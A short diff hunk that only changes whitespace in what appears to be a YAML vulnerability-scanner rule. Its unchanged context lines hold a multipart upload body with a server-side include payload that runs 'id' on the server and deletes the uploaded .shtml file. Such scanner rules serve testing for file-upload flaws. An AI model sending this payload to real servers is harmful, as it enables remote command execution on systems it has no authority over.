@@ -12,7 +12,7 @@ rules:
       Content-Type: text/plain
 
       <!--#exec cmd="id;rm {{r1}}.shtml" -->
-     
+
       -----------------------------{{r2}}--
     follow_redirects: false
     expression: |
